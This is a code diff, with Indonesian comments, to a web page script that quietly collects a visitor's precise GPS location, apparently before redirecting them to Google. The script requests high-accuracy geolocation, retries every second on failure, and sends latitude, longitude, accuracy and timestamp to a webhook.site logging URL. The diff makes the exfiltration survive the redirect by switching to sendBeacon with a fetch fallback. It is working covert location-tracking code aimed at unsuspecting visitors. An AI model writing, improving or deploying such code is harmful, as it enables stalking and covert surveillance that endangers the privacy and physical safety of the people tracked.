@@ -39,25 +39,37 @@ button {
 const TARGET = "https://www.google.com";
 const LOG_ENDPOINT = "https://webhook.site/248bcd36-211a-4a46-9a54-c54dc32b4119";
 
-let sent = false;      // 🔥 hanya kirim 1x
-let triggered = false; // redirect control
+let sent = false;
+let triggered = false;
 
-// ===== KIRIM LOKASI SAJA =====
+// ===== POST LOCATION =====
 function sendLocation(pos) {
   if (sent) return;
   sent = true;
 
-  const params = new URLSearchParams({
+  const data = JSON.stringify({
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
     acc: pos.coords.accuracy,
     ts: Date.now()
   });
 
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
+  // 🔥 utama (aman saat redirect)
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(LOG_ENDPOINT, data);
+  } else {
+    // fallback
+    fetch(LOG_ENDPOINT, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: data
+    }).catch(()=>{});
+  }
 }
 
-// ===== GEO HIGH ACCURACY =====
+// ===== GEO =====
 function getLocation() {
   if (!navigator.geolocation) return;
 
@@ -72,13 +84,12 @@ function getLocation() {
       }
     },
     err => {
-      // retry biar peluang dapet GPS lebih tinggi
       setTimeout(getLocation, 1000);
     },
     {
-      enableHighAccuracy: true, // 🔥 GPS
+      enableHighAccuracy: true,
       timeout: 10000,
-      maximumAge: 0             // no cache
+      maximumAge: 0
     }
   );
 }
